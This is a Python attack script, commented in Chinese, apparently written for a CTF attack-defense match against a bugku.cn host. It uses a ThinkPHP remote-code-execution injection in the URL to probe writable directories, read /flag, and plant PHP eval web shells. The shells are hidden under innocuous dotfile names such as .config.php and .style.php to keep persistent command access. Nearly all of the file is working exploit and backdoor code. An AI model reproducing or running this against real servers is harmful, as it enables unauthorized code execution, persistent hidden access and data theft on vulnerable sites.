#!/usr/bin/env python3
"""Team 2 持久化后门 - 使用Python避免shell转义问题"""
import requests
import base64
import time
import sys

HOST = "192-168-1-2.pvp7574.bugku.cn"

def rce_exec(code):
    """通过ThinkPHP RCE执行PHP代码"""
    payload = "${@print(" + code + ")}"
    url = f"http://{HOST}/index.php?s=/Index/index/name/{payload}"
    try:
        r = requests.get(url, timeout=8)
        return r.text
    except:
        return ""

def write_file(path, content):
    """写入文件"""
    b64 = base64.b64encode(content.encode()).decode()
    code = f"file_put_contents('{path}',base64_decode('{b64}'))"
    result = rce_exec(code)
    return result

def verify_file(path):
    """验证文件是否存在"""
    code = f"file_exists('{path}')?'EXISTS':'NO'"
    result = rce_exec(code)
    return 'EXISTS' in result

def main():
    print("=== Team 2 持久化后门 ===\n")

    # 1. 检查函数可用性
    print("1. 检查函数:")
    for fn in ['file_put_contents', 'fopen', 'fwrite', 'file_get_contents', 'copy', 'rename', 'move_uploaded_file']:
        result = rce_exec(f"function_exists('{fn}')?'Y':'N'")
        available = 'Y' in result and 'N' not in result.split('Y')[0][-1:]
        # 更准确的方法：检查页面是否正常（不是错误页271字节）
        if len(result) > 500:
            print(f"  {fn}: 可用 (响应 {len(result)} 字节)")
        else:
            print(f"  {fn}: 不可用 (响应 {len(result)} 字节)")

    # 2. 检查可写目录
    print("\n2. 检查可写目录:")
    for dir_path in ['/app/Data', '/app/Runtime', '/app/uploads', '/tmp', '/app/Public']:
        result = rce_exec(f"is_writable('{dir_path}')?'W':'N'")
        if 'W' in result and len(result) > 500:
            print(f"  {dir_path}: 可写")
        else:
            print(f"  {dir_path}: 不可写")

    # 3. 尝试写入后门
    print("\n3. 写入后门:")
    shell_content = '<?php @eval($_POST["cmd"]);?>'
    b64_shell = base64.b64encode(shell_content.encode()).decode()

    write_paths = [
        '/app/Data/.config.php',
        '/app/Runtime/.cache.php',
        '/app/Public/.style.php',
        '/tmp/.bd.php',
        '/app/uploads/.index.php',
    ]

    for path in write_paths:
        # 方法1: file_put_contents + base64
        code = f"file_put_contents('{path}',base64_decode('{b64_shell}'))"
        rce_exec(code)

        # 验证
        exists = verify_file(path)
        if exists:
            print(f"  [✅] {path} 写入成功!")
            # 测试执行
            web_path = path.replace('/app', '')
            try:
                r = requests.post(f"http://{HOST}{web_path}", data={'cmd': "echo 'BD_OK';"}, timeout=5)
                if 'BD_OK' in r.text:
                    print(f"       执行成功: {web_path}")
            except:
                pass
        else:
            # 方法2: fopen + fwrite
            code = f"$f=fopen('{path}','w');fwrite($f,base64_decode('{b64_shell}'));fclose($f);echo 'OK';"
            rce_exec(code)
            exists = verify_file(path)
            if exists:
                print(f"  [✅] {path} 写入成功(fopen)!")
            else:
                print(f"  [-] {path} 写入失败")

    # 4. 获取当前flag
    print("\n4. 当前flag:")
    flag = rce_exec("file_get_contents('/flag')")
    import re
    m = re.search(r'flag\{[^}]+\}', flag)
    if m:
        print(f"  {m.group()}")

    # 5. 通过RCE修改ThinkPHP配置添加后门路由
    print("\n5. 尝试修改ThinkPHP配置:")
    # 修改 index.php 添加后门
    code = "file_put_contents('/app/Data/r.php','<?php @eval($_POST[\"cmd\"]);?>')"
    rce_exec(code)
    if verify_file('/app/Data/r.php'):
        print("  [✅] /app/Data/r.php 写入成功")
        r = requests.post(f"http://{HOST}/Data/r.php", data={'cmd': "echo 'OK';"}, timeout=5)
        if 'OK' in r.text:
            print("  [✅] 后门可执行!")
        else:
            print(f"  [-] 后门无法执行 (响应: {r.text[:50]})")
    else:
        print("  [-] 写入失败")

if __name__ == '__main__':
    main()
